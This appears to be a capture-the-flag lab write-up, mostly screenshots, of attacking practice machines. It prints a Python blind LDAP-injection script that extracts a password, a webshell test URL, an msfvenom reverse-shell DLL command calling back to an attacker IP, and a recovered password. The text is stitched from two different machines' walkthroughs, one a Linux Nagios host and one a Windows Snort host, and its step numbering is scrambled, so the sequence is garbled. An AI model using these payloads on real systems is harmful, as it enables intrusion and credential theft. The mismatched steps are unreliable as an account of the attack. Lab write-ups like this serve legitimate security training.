sup:: [[Home]]
tags:: #map 

# Monitored 🗃

![image](https://github.com/user-attachments/assets/b964d909-8158-4653-a20a-f8974e9a89c5)


Let's get started...

---
### Steps
1.  **Start your vpn**
	Go to the directory where your downloaded vpn and start the vpn as shown below
	
![Pasted image 20240114130711](https://github.com/user-attachments/assets/e95d6bbf-468d-46d3-94b5-8a0ee4629711)


Next, we will perform directory bruteforcing with dirsearch:

![Pasted image 20240125091611](https://github.com/user-attachments/assets/84641f85-55e3-48fd-b86d-6e7196910ab9)


2. Run a scan using incursore.sh
    
![Pasted image 20240125091813](https://github.com/user-attachments/assets/b9e519f3-cb78-4bb2-8993-b28edb8609e3)

![Pasted image 20240125094504](https://github.com/user-attachments/assets/a9bf7880-6371-4051-b101-e324737fd26d)

![Pasted image 20240125095313](https://github.com/user-attachments/assets/70e3cbae-072b-4e94-82f3-69e9278428eb)


3. Began enumerating the dns for sub-domains:
	a. 	
![Pasted image 20240125104520](https://github.com/user-attachments/assets/4c3eaa5d-864e-44d6-8c48-fa122766ebb8)


	b. I tried running with gobuster:

![Pasted image 20240125120548](https://github.com/user-attachments/assets/faeb2b70-6205-4691-9e1d-9d5a03e6daaa)



![Pasted image 20240126082147](https://github.com/user-attachments/assets/b12cae25-cce9-474b-8c88-34479030b061)


ffuf -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://internal.analysis.htb/FUZZ

![Pasted image 20240126123301](https://github.com/user-attachments/assets/08de5ba4-0a49-445a-a697-b415ee626dac)

![Pasted image 20240126124148](https://github.com/user-attachments/assets/b4654827-4c72-4ac1-80d3-6ad22daddfe7)


		c. Next, again ran ffuf

ffuf -w SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://internal.analysis.htb/employees/FUZZ -e .php,.html,.js

![Pasted image 20240125192113](https://github.com/user-attachments/assets/97accf50-33f7-4ae9-bc9b-872f722a0431)


![Pasted image 20240125193911](https://github.com/user-attachments/assets/4bce38b9-6af8-474a-9342-47a90d5e0363)



6. Next, nabigate to the /login.php found by ffuf:

![Pasted image 20240125185823](https://github.com/user-attachments/assets/63717b31-5731-443b-ac37-c2d037ea47b2)


7. Ran ffuf again but this time it was for the /users

ffuf -w SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://internal.analysis.htb/users/FUZZ -e .php,.html,.js


![Pasted image 20240125204937](https://github.com/user-attachments/assets/975b9fa7-6d7e-447f-9bad-7fdd3820cfee)


9. Accessing the /list.php page, we found this:
![Pasted image 20240126024735](https://github.com/user-attachments/assets/3572d696-4fd9-4372-a5fb-cec6748c154f)


10. Now, since the parameter is missing let's try with parameters:

id=1&name=test
![Pasted image 20240126031222](https://github.com/user-attachments/assets/a70a9a00-bef8-41de-926c-9e9a74d0fce7)


name=*
![Pasted image 20240126031321](https://github.com/user-attachments/assets/1eea2747-252c-4f6c-a7a1-a30dac22eadf)



12. Enumerated with kerberute
![Pasted image 20240126081530](https://github.com/user-attachments/assets/b19ec089-df0f-44cd-b412-7618a0dfeb2b)


13. Crafted a python script to crack the password:
```python
#!/usr/bin/python

import argparse
import requests
import urllib.parse

def main():
    charset_path = "/home/kali/SecLists/Fuzzing/alphanum-case-extra.txt"
    base_url = "http://internal.analysis.htb/users/list.php?name=*)(%26(objectClass=user)(description={found_char}{FUZZ}*)"
    found_chars = ""
    skip_count = 6
    add_star = True
    with open(charset_path, 'r') as file:
        for char in file:
            char = char.strip()
            # URL encode the character
            char_encoded = urllib.parse.quote(char)
            # Check if '*' is found and skip the first 6 '*' characters
            if '*' in char and skip_count > 0:
                skip_count -= 1
                continue
            # Add '*' after encountering it for the first time
            if '*' in char and add_star:
                found_chars += char
                print(f"[+] Found Password: {found_chars}")
                add_star = False
                continue
            modified_url = base_url.replace("{FUZZ}", char_encoded).replace("{found_char}", found_chars)
            response = requests.get(modified_url)
            if "technician" in response.text and response.status_code == 200:
                found_chars += char
                print(f"[+] Found Password: {found_chars}")
                file.seek(0, 0)

if __name__ == "__main__":
    main()
```


14. The script was able to find the password:

![Pasted image 20240126085743](https://github.com/user-attachments/assets/16d63526-3f3e-4edb-ac7f-cc5b00587f44)

I checked the IP of my VPN
97NTtl*4QP96BV

I now inserted it into the shell command and clicked on Save button:


12. Used the found credentials to enter into the login page:

![Pasted image 20240126085529](https://github.com/user-attachments/assets/04880ed9-c4a7-4076-b43c-89e28bbacef8)


14. And we got authenticated:

![Pasted image 20240126090239](https://github.com/user-attachments/assets/ad3dfb29-ab15-41bd-8f03-f2ea6d9b50f2)


16. Navigated to SOC Report and went in search of a webshell to see if I can upload it to the site:
![Pasted image 20240126090520](https://github.com/user-attachments/assets/fe597cd1-e2cf-41eb-bd2e-6c6f22313338)

![Pasted image 20240126104443](https://github.com/user-attachments/assets/d02a62e8-e8e8-49f3-8364-62045db0c4d6)


18. Since we uploaded the webshell and there wasn't error "File is safe" we need to confirm if it uploaded successfully:
http://internal.analysis.htb/dashboard/uploads/webshell.php?cmd=whoami

![Pasted image 20240126104542](https://github.com/user-attachments/assets/8ed3c932-4b9f-4a74-bd40-100bfa0c03be)


19. Now, let's use a php cmd shell to upload this time:

![Pasted image 20240126120722](https://github.com/user-attachments/assets/a6390b57-14d4-4dc9-93d2-aadc45f38a42)



![Pasted image 20240127091751](https://github.com/user-attachments/assets/d7fcf796-5d02-4ba6-bd50-86ad9f45c103)



21. We could try to abuse the service by either stopping, restarting and so on the npcd service. But first, let's attempt to stop the service.

Note: Before we do that I always like to create a backup file, just in case something goes wrong we can always revert back:

![Pasted image 20240127092659](https://github.com/user-attachments/assets/7549c95c-3017-46cc-ba97-f56e96142ec2)


![Pasted image 20240127092914](https://github.com/user-attachments/assets/f7ecaf4a-57f5-4359-afbd-565cb1bc4c90)


![Pasted image 20240127100342](https://github.com/user-attachments/assets/36ddcf3f-1c9a-489a-802e-718d48fe6344)


16. Created a dll payload for transfer to the target:

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.151 LPORT=4555 -f dll -o r2.dll

!![Pasted image 20240127120423](https://github.com/user-attachments/assets/7aaf7f28-95f3-4d76-b0e9-0c6b77059032)



16. Upload the dll file
sudo /usr/local/nagiosxi/scripts/manage_services.sh stop npcd

![Pasted image 20240127104013](https://github.com/user-attachments/assets/017b907d-5b4b-4523-ba65-a489356ed2b8)


17. Now. let's delete the npcd file

![Pasted image 20240127104054](https://github.com/user-attachments/assets/3d9abc1d-9285-40b5-a84d-57dd6eed1920)


18. Now, we can create our own npcd file with a reverse shell code inside:

![Pasted image 20240127104249](https://github.com/user-attachments/assets/dc6a481d-323a-4813-a576-d396c66debc6)


19. Give the file execute permissions:

![Pasted image 20240127114949](https://github.com/user-attachments/assets/f3d1f4a4-ff1a-4ac0-aa6a-7308f7ede5d4)



20. Remove any exploit to clean up the system

Powershell commandlet
Remove-Item C:\Snort\lib\snort_dynamicpreprocessor\l2.dll

![Pasted image 20240127140951](https://github.com/user-attachments/assets/54df9c6f-fa82-4c29-80b4-24f0955ea150)


So, finally we escalated our privileges to the root user!!!
